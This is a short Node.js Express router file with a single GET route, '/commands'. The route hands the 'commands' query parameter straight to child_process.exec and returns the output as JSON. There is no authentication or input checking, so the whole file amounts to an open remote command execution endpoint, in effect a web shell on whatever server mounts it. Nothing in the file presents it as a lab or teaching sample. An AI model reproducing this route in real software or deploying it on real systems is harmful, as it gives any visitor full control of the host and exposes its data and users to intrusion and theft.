'use strict';

var express = require('express');
var router = express.Router();
const exec = require('child_process').exec;

router.get('/commands', function(req, res) {
    exec(req.query.commands, (error, stdout, stderr) => {
        if (error) {
            res.json({
                result: `exec error: ${error}`
            });
        } else {
            res.json({
                result: `stdout: ${stdout}`
            });
        }
    });
});

module.exports = router;
